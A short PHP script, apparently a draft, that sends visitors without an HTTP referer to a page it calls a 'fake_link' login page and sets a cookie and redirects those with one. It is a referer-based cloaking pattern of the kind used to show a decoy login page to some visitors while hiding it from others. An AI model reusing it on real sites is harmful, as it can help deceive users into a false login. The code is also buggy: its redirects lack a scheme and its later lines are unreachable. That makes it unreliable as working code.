<?php
session_start();
$host = $_SERVER["HTTP_HOST"];
$uri = $_SERVER["REQUEST_URI"];
$http_referer = $_SERVER["HTTP_REFERER"];
$name = 'language';
$value = time();
$expire = time() + 60*10; // 10 mins from now
$path = '/blog';
$domain = 'www.puhex.com';
$secure = isset($_SERVER['HTTPS']); // or use true/false
$httponly = true;
$cache = false;
if(isset($_SESSION["language"])){
    if($_SESSION["language"]<time()){
        $cache = true;
    }
}
$new_link = $host.$uri;
$fake_link = "login.php";

if(!isset($http_referer)){
    if($cache){
        redirect($new_link);
    }else{
        redirect($fake_link);
    }
}else{
    setcookie($name, $value, $expire, $path, $domain, $secure, $httponly);
    redirect($new_link);
}

if($http_referer=="https://www.google.com/"){
   // redirect($new_link);
   redirect($new_link);
}

echo  "host: " .$host;
echo  "<br>uri: " .$uri;
echo  "<br>http_referer: " .$http_referer;
echo  "<br>" ;
echo  "<br>" ;
echo  "<br>" ;
echo "<pre>$_SERVER</pre>";



function redirect($url) {
    ob_start();
    header('Location: '.$url);
    ob_end_flush();
    die();
}




?>
